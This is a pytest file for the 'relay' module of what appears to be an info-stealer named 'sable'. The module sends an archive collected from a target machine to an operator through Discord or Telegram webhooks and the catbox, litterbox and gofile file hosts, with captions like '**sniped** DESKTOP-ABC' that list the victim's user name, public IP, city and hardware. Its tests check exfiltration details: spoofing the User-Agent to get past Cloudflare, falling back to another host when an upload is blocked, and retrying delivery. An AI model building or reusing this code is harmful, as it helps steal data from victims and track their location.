"""Relay delivery.

The failures guarded here were both measured against a live endpoint rather than
imagined: a webhook that answered 403 to the default urllib agent, and a source
repository that logged success on a 401 because it never read the status code.
"""

from __future__ import annotations

import json
import sys
import urllib.error
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import relay  # noqa: E402
from core.schema import RELAY_KINDS  # noqa: E402


class Response:
    def __init__(self, status: int, payload: bytes = b"") -> None:
        self.status = status
        self._payload = payload

    def read(self, size: int = -1) -> bytes:
        return self._payload

    def __enter__(self) -> Response:
        return self

    def __exit__(self, *_: object) -> bool:
        return False


def capture(monkeypatch: pytest.MonkeyPatch, response: Response) -> list:
    seen: list = []

    def fake_urlopen(request: object, timeout: float | None = None, context: object = None) -> Response:
        seen.append(request)
        return response

    monkeypatch.setattr(relay.urllib.request, "urlopen", fake_urlopen)
    return seen


def test_a_user_agent_is_always_sent(monkeypatch: pytest.MonkeyPatch) -> None:
    # Cloudflare answers ``Python-urllib/3.12`` with 403 and the body "error code:
    # 1010". Measured: default agent 403, this header 204, same URL, same body.
    seen = capture(monkeypatch, Response(204))
    relay._post("https://example.invalid/hook", b"body", "boundary")

    request = seen[0]
    agent = request.get_header("User-agent")
    assert agent, "no User-Agent header was set"
    assert "Python-urllib" not in agent


def test_a_success_status_returns(monkeypatch: pytest.MonkeyPatch) -> None:
    capture(monkeypatch, Response(200))
    relay._post("https://example.invalid/hook", b"body", "boundary")


def test_a_non_2xx_status_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    capture(monkeypatch, Response(500))
    with pytest.raises(relay.RelayError) as caught:
        relay._post("https://example.invalid/hook", b"body", "boundary")
    assert "500" in str(caught.value)


def test_an_http_error_carries_its_code(monkeypatch: pytest.MonkeyPatch) -> None:
    def raise_error(*_: object, **__: object) -> Response:
        raise urllib.error.HTTPError("https://example.invalid", 401, "no", {}, None)

    monkeypatch.setattr(relay.urllib.request, "urlopen", raise_error)
    with pytest.raises(relay.RelayError) as caught:
        relay._post("https://example.invalid/hook", b"body", "boundary")
    assert "401" in str(caught.value)


def test_an_unreachable_relay_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    def raise_error(*_: object, **__: object) -> Response:
        raise urllib.error.URLError("no route")

    monkeypatch.setattr(relay.urllib.request, "urlopen", raise_error)
    with pytest.raises(relay.RelayError):
        relay._post("https://example.invalid/hook", b"body", "boundary")


# --- body shape -------------------------------------------------------------


def test_multipart_carries_the_file_and_the_fields() -> None:
    body, boundary = relay._multipart(
        {"payload_json": '{"content": "x"}'},
        "files[0]",
        "sable.zip",
        b"PK\x03\x04payload",
        "application/zip",
    )

    assert boundary.encode() in body
    assert b'name="payload_json"' in body
    assert b'name="files[0]"; filename="sable.zip"' in body
    assert b"Content-Type: application/zip" in body
    assert b"PK\x03\x04payload" in body
    assert body.endswith(b"--\r\n")


def test_content_type_follows_the_real_extension(tmp_path: Path) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"x")
    assert relay._content_type(archive) == "application/zip"

    other = tmp_path / "sable.7z"
    other.write_bytes(b"x")
    with pytest.raises(relay.RelayError):
        relay._content_type(other)


# --- transmit ---------------------------------------------------------------


class Relay:
    def __init__(
        self, kind: str, endpoint: str, ping: str = "", mention: str = "@here"
    ) -> None:
        self.kind = kind
        self.endpoint = endpoint
        self.ping = ping
        self.mention = mention


class Config:
    def __init__(
        self, kind: str, endpoint: str, ping: str = "", mention: str = "@here"
    ) -> None:
        self.relay = Relay(kind, endpoint, ping, mention)


def test_transmit_gives_up_after_three_attempts(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04")

    attempts: list[int] = []

    def fail(*_: object, **__: object) -> None:
        attempts.append(1)
        raise relay.RelayError("nope")

    monkeypatch.setattr(relay, "_send_https", fail)
    monkeypatch.setattr(relay.time, "sleep", lambda _: None)

    with pytest.raises(relay.RelayError):
        relay.transmit(Config("https", "https://example.invalid/hook"), archive)

    assert len(attempts) == relay._ATTEMPTS


def test_transmit_refuses_a_missing_archive(tmp_path: Path) -> None:
    with pytest.raises(relay.RelayError):
        relay.transmit(Config("https", "https://example.invalid/hook"), tmp_path / "gone.zip")


def test_transmit_refuses_an_empty_archive(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(relay.time, "sleep", lambda _: None)
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"")
    with pytest.raises(relay.RelayError):
        relay.transmit(Config("https", "https://example.invalid/hook"), archive)


def test_a_caption_fits_the_telegram_limit() -> None:
    text = relay._fit("x" * 5000, relay._CAPTION_LIMIT)
    assert len(text) == relay._CAPTION_LIMIT
    assert text.endswith("...")


# --- link relay -------------------------------------------------------------


def test_a_small_archive_goes_to_the_permanent_host() -> None:
    host, fields = relay._link_host(50 * 1024 * 1024)
    assert host == relay._CATBOX
    assert fields["reqtype"] == "fileupload"
    assert "time" not in fields


def test_a_large_archive_goes_to_the_expiring_host() -> None:
    host, fields = relay._link_host(400 * 1024 * 1024)
    assert host == relay._LITTERBOX
    assert fields["time"] == relay._LITTERBOX_TIME


def test_an_archive_past_both_ceilings_is_refused() -> None:
    with pytest.raises(relay.RelayError):
        relay._link_host(relay._LITTERBOX_MAX + 1)


def test_the_timeout_grows_with_the_body_and_stops_growing() -> None:
    assert relay._upload_timeout(1024) == relay._MIN_UPLOAD_TIMEOUT
    assert relay._upload_timeout(400 * 1024 * 1024) > relay._MIN_UPLOAD_TIMEOUT
    assert relay._upload_timeout(relay._MAX_UPLOAD) == relay._MAX_UPLOAD_TIMEOUT


def test_send_link_uploads_first_and_posts_the_url(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04" + b"x" * 2048)

    calls: list[tuple[str, object]] = []

    def fake_post(
        url: str, body: relay._Body, boundary: str, timeout: float = 0.0
    ) -> bytes:
        calls.append(("upload", url))
        assert b"fileToUpload" in body.head()
        # The file is left on disk and streamed; the body knows its own total length.
        assert body.length > archive.stat().st_size
        return b"https://files.example/abc.zip"

    def fake_json(url: str, document: dict[str, str], timeout: float = 0.0) -> bytes:
        calls.append(("message", url))
        assert "https://files.example/abc.zip" in document["content"]
        return b""

    monkeypatch.setattr(relay, "_reachable", lambda _: True)
    monkeypatch.setattr(relay, "_post", fake_post)
    monkeypatch.setattr(relay, "_post_json", fake_json)

    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")

    assert [kind for kind, _ in calls] == ["upload", "message"]
    assert calls[0][1] == relay._CATBOX
    assert calls[1][1] == "https://hook.example/abc"


def test_send_link_falls_back_when_the_host_returns_html(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # A 200 with an error page is exactly how a blocked upload looks from here, and the
    # file still has to reach the operator, so the fallback takes it.
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04")

    posted: list[str] = []

    monkeypatch.setattr(relay, "_reachable", lambda _: True)
    monkeypatch.setattr(relay, "_post", lambda *a, **k: b"<html>blocked</html>")
    monkeypatch.setattr(relay, "_gofile", lambda *a, **k: "https://gofile.io/d/abc")
    monkeypatch.setattr(
        relay,
        "_post_json",
        lambda _url, document, timeout=0.0: posted.append(document["content"]) or b"",
    )

    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
    assert len(posted) == 1
    assert "https://gofile.io/d/abc" in posted[0]
    assert "blocked" not in posted[0]


def test_send_link_falls_back_when_the_upload_fails(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04")

    posted: list[str] = []

    def fail(*_: object, **__: object) -> bytes:
        raise relay.RelayError("upload refused")

    monkeypatch.setattr(relay, "_reachable", lambda _: True)
    monkeypatch.setattr(relay, "_post", fail)
    monkeypatch.setattr(relay, "_gofile", lambda *a, **k: "https://gofile.io/d/abc")
    monkeypatch.setattr(
        relay,
        "_post_json",
        lambda _url, document, timeout=0.0: posted.append(document["content"]) or b"",
    )

    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
    assert len(posted) == 1
    assert "https://gofile.io/d/abc" in posted[0]


def test_send_link_skips_the_upload_when_the_download_host_is_dead(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The measured failure: catbox accepted the upload and its download name was reset
    # at the TLS layer, so a link was posted that nobody could open.
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04")

    uploaded: list[int] = []
    posted: list[str] = []

    monkeypatch.setattr(relay, "_reachable", lambda _: False)
    monkeypatch.setattr(
        relay,
        "_post",
        lambda *a, **k: uploaded.append(1) or b"https://files.catbox.moe/abc.zip",
    )
    monkeypatch.setattr(relay, "_gofile", lambda *a, **k: "https://gofile.io/d/abc")
    monkeypatch.setattr(
        relay,
        "_post_json",
        lambda _url, document, timeout=0.0: posted.append(document["content"]) or b"",
    )

    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
    assert uploaded == []
    assert "https://gofile.io/d/abc" in posted[0]


def test_send_link_posts_nothing_when_both_hosts_fail(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04")

    posted: list[int] = []

    def fail(*_: object, **__: object) -> bytes:
        raise relay.RelayError("upload refused")

    monkeypatch.setattr(relay, "_reachable", lambda _: True)
    monkeypatch.setattr(relay, "_post", fail)
    monkeypatch.setattr(relay, "_gofile", fail)
    monkeypatch.setattr(relay, "_post_json", lambda *a, **k: posted.append(1) or b"")

    with pytest.raises(relay.RelayError):
        relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
    assert posted == []


def test_gofile_reads_the_two_step_answer(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    archive = tmp_path / "sable.zip"
    payload = b"PK\x03\x04payload"
    archive.write_bytes(payload)

    seen = capture(
        monkeypatch,
        Response(200, b'{"data": {"servers": [{"name": "store1"}]}}'),
    )
    urls: list[str] = []

    def fake_post(
        url: str, body: relay._Body, boundary: str, timeout: float = 0.0
    ) -> bytes:
        urls.append(url)
        assert b"filename=\"sable.zip\"" in body.head()
        return b'{"data": {"downloadPage": "https://gofile.io/d/abc"}}'

    monkeypatch.setattr(relay, "_post", fake_post)
    assert relay._gofile(archive) == "https://gofile.io/d/abc"
    assert urls == ["https://store1.gofile.io/contents/uploadfile"]
    assert seen[0].full_url == relay._GOFILE_SERVERS


def test_a_reachable_check_treats_an_http_error_as_alive(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # A 403 on the root still proves the name resolves and TLS completes.
    def refuse(*_: object, **__: object) -> Response:
        raise urllib.error.HTTPError("https://files.example/", 403, "no", {}, None)

    monkeypatch.setattr(relay.urllib.request, "urlopen", refuse)
    assert relay._reachable("https://files.example/") is True


def test_a_reachable_check_treats_a_reset_as_dead(monkeypatch: pytest.MonkeyPatch) -> None:
    def reset(*_: object, **__: object) -> Response:
        raise urllib.error.URLError("remote end closed connection without response")

    monkeypatch.setattr(relay.urllib.request, "urlopen", reset)
    assert relay._reachable("https://files.example/") is False


def test_a_link_message_fits_a_discord_message(tmp_path: Path) -> None:
    text = relay._link_message("**sniped** BOX", "https://files.example/" + "a" * 50)
    assert "https://files.example/" in text
    assert len(text) <= relay._MESSAGE_LIMIT


def _recorder(sink: list[str], label: str):
    def send(*_: object, **__: object) -> None:
        sink.append(label)

    return send


def test_every_relay_kind_reaches_a_sender(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # A kind that exists in the schema and has no branch in transmit is a build that
    # ships and then fails on the target with the archive already collected.
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04")

    expected = {"https": "_send_https", "telegram": "_send_telegram", "link": "_send_link"}
    assert set(expected) == set(RELAY_KINDS)

    for kind, name in expected.items():
        fired: list[str] = []
        for other in expected.values():
            monkeypatch.setattr(relay, other, _recorder(fired, other))
        relay.transmit(Config(kind, "https://example.invalid/hook"), archive)
        assert fired == [name], (kind, fired)


# --- readable caption -------------------------------------------------------

_SUMMARY = {
    "hostname": "DESKTOP-ABC",
    "user": "killywilly",
    "os": "Windows 11 Pro (26100)",
    "public_ip": "203.0.113.7",
    "city": "Ashburn",
    "region": "Virginia",
    "country": "United States",
    "isp": "Example ISP",
    "lan_ip": "192.168.1.20",
    "cpu": "AMD Ryzen 7 5800X",
    "gpu": "NVIDIA GeForce RTX 3080",
    "ram_gib": 31.9,
    "arch": "x86_64",
    "uptime": "3d 4h",
    "gate": "clean",
}


def test_describe_reads_like_a_result() -> None:
    # The old caption was "sable payload.zip 1504 bytes" and nobody could read it.
    text = relay.describe(_SUMMARY)
    assert "**sniped** DESKTOP-ABC" in text
    assert "**user** killywilly" in text
    assert "**ip** 203.0.113.7 · Ashburn, Virginia, United States · Example ISP" in text
    assert "**cpu** AMD Ryzen 7 5800X" in text
    assert "**box** 32 GB ram · x86_64 · up 3d 4h" in text
    assert "**gate** clean" in text
    assert "unknown" not in text.lower()


def test_describe_drops_what_it_does_not_have() -> None:
    assert relay.describe(None) == ""
    assert relay.describe({}) == ""
    partial = relay.describe({"hostname": "BOX"})
    assert partial == "**sniped** BOX"


def test_a_caption_carries_the_machine_and_the_archive(tmp_path: Path) -> None:
    archive = tmp_path / "payload.zip"
    archive.write_bytes(b"PK\x03\x04" + b"x" * 2044)
    cfg = Config("https", "https://example.invalid/hook", mention="@everyone")
    text = relay._caption(cfg, archive, _SUMMARY)
    assert text.startswith("@everyone **sniped** DESKTOP-ABC")
    assert "**archive** payload.zip · 2.0 KB" in text


def test_a_caption_without_a_summary_still_names_the_file(tmp_path: Path) -> None:
    archive = tmp_path / "payload.zip"
    archive.write_bytes(b"x")
    text = relay._caption(Config("https", "https://example.invalid/hook"), archive, None)
    assert "payload.zip" in text


# --- status webhook ---------------------------------------------------------


def test_notify_sends_the_mention_and_allows_it(monkeypatch: pytest.MonkeyPatch) -> None:
    # Discord drops an unallowed mention silently, so the payload has to carry the
    # opt-in object or the ping arrives looking like a ping and ringing nothing.
    seen = capture(monkeypatch, Response(204))
    cfg = Config("https", "https://example.invalid/hook", ping="https://example.invalid/status")
    assert relay.notify(cfg, "delivered", alert=True) is True

    body = json.loads(seen[0].data.decode("utf-8"))
    assert body["content"] == "@here delivered"
    assert body["allowed_mentions"] == {"parse": ["everyone", "users", "roles"]}


def test_notify_leaves_a_stage_message_quiet(monkeypatch: pytest.MonkeyPatch) -> None:
    seen = capture(monkeypatch, Response(204))
    cfg = Config("https", "https://example.invalid/hook", ping="https://example.invalid/status")
    relay.notify(cfg, "collecting", alert=False)

    body = json.loads(seen[0].data.decode("utf-8"))
    assert body["content"] == "collecting"


def test_notify_is_silent_without_a_status_webhook(monkeypatch: pytest.MonkeyPatch) -> None:
    seen = capture(monkeypatch, Response(204))
    cfg = Config("https", "https://example.invalid/hook")
    assert relay.notify(cfg, "delivered", alert=True) is False
    assert seen == []


def test_notify_swallows_a_dead_webhook(monkeypatch: pytest.MonkeyPatch) -> None:
    # A status message is a courtesy. If it raises, it costs the collection it reports.
    def explode(*_: object, **__: object) -> bytes:
        raise relay.RelayError("gone")

    monkeypatch.setattr(relay, "_post_json", explode)
    cfg = Config("https", "https://example.invalid/hook", ping="https://example.invalid/status")
    assert relay.notify(cfg, "delivered", alert=True) is False


def test_notify_puts_no_mention_when_none_is_configured(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen = capture(monkeypatch, Response(204))
    cfg = Config(
        "https",
        "https://example.invalid/hook",
        ping="https://example.invalid/status",
        mention="",
    )
    relay.notify(cfg, "delivered", alert=True)
    body = json.loads(seen[0].data.decode("utf-8"))
    assert body["content"] == "delivered"


# --- proxies and other networks ---------------------------------------------


@pytest.mark.parametrize(
    "host",
    ["192.168.1.151", "10.0.0.5", "172.16.4.4", "127.0.0.1", "localhost", "LOCALHOST"],
)
def test_a_host_on_this_network_is_local(host: str) -> None:
    assert relay._is_local(host) is True


@pytest.mark.parametrize(
    "host", ["8.8.8.8", "discord.com", "gofile.io", "1.1.1.1", ""],
)
def test_a_public_host_is_not_local(host: str) -> None:
    assert relay._is_local(host) is False


def test_a_lan_request_does_not_go_through_the_system_proxy(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The failure this pins: a VPN client exported http_proxy=127.0.0.1:<port> with
    # no_proxy covering loopback only, so a POST to a LAN address answered 502 from
    # the proxy instead of reaching the listener next door.
    opened: list[str] = []

    class Recorder:
        def open(self, request: object, timeout: float | None = None) -> Response:
            opened.append("local")
            return Response(204)

    def fake_urlopen(*_: object, **__: object) -> Response:
        opened.append("proxied")
        return Response(204)

    monkeypatch.setattr(relay, "_LOCAL_OPENER", Recorder())
    monkeypatch.setattr(relay.urllib.request, "urlopen", fake_urlopen)

    request = relay.urllib.request.Request("http://192.168.1.151:8099/upload", method="POST")
    with relay._open(request, 5.0) as response:
        assert response.status == 204

    assert opened == ["local"]


def test_a_public_request_still_uses_the_default_opener(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    opened: list[str] = []

    class Recorder:
        def open(self, request: object, timeout: float | None = None) -> Response:
            opened.append("local")
            return Response(204)

    def fake_urlopen(*_: object, **__: object) -> Response:
        opened.append("proxied")
        return Response(204)

    monkeypatch.setattr(relay, "_LOCAL_OPENER", Recorder())
    monkeypatch.setattr(relay.urllib.request, "urlopen", fake_urlopen)

    request = relay.urllib.request.Request("https://discord.com/api/webhooks/x", method="POST")
    with relay._open(request, 5.0) as response:
        assert response.status == 204

    assert opened == ["proxied"]


# --- streaming body ---------------------------------------------------------


def test_the_streamed_body_is_the_same_bytes_as_the_buffered_one(tmp_path: Path) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"PK\x03\x04" + bytes(range(256)) * 40)

    buffered, boundary = relay._multipart(
        {"field": "value"}, "file", "sable.zip", archive.read_bytes(), "application/zip"
    )
    streamed, streamed_boundary = relay._multipart_stream(
        {"field": "value"}, "file", archive, "application/zip"
    )

    # Same field order, same file part, same closing delimiter: only the boundary
    # token differs, and it is random per call.
    assert buffered.replace(boundary.encode(), b"BOUNDARY") == b"".join(
        streamed
    ).replace(streamed_boundary.encode(), b"BOUNDARY")


def test_the_streamed_body_reports_its_total_length(tmp_path: Path) -> None:
    archive = tmp_path / "sable.zip"
    payload = b"PK\x03\x04" + b"z" * 5000
    archive.write_bytes(payload)

    body, _ = relay._multipart_stream({}, "file", archive, "application/zip")

    assert len(body) == body.length
    assert body.length == len(b"".join(body))
    assert body.length > len(payload), "headers and closing delimiter are counted"


def test_the_file_is_read_in_blocks_not_loaded_whole(tmp_path: Path) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"q" * (3 * relay._CHUNK + 17))
    body, _ = relay._multipart_stream({}, "file", archive, "application/zip")

    blocks = [block for block in body if len(block) == relay._CHUNK]

    assert len(blocks) == 3, f"expected three full chunks, got {len(blocks)}"


def test_an_empty_archive_is_refused_before_a_socket_is_opened(tmp_path: Path) -> None:
    archive = tmp_path / "sable.zip"
    archive.write_bytes(b"")

    with pytest.raises(relay.RelayError, match="empty"):
        relay._size(archive)


def test_describe_names_a_source_that_failed() -> None:
    text = relay.describe(
        {"hostname": "BOX", "gate": "clean", "failed": {"sessions": "OSError: locked"}}
    )
    assert "**gate** clean" in text
    assert "**failed** sessions (OSError: locked)" in text


def test_describe_omits_the_failed_line_when_everything_ran() -> None:
    assert "**failed**" not in relay.describe({"hostname": "BOX", "failed": {}})
